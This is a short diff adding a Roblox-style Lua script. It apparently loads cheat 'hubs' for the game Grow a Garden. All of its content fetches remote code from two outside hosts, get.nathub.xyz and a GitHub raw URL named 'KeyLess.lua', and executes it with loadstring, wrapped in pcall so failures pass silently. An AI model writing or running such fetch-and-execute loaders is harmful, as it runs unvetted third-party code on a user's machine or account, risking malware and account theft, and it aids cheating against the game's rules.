@@ -1,0 +1,9 @@
+local success1, err1 = pcall(function()
+    loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()
+end)
+
+local success2, err2 = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkHub23/Grow-a-Garden/main/KeyLess.lua"))()
+end)
+
+
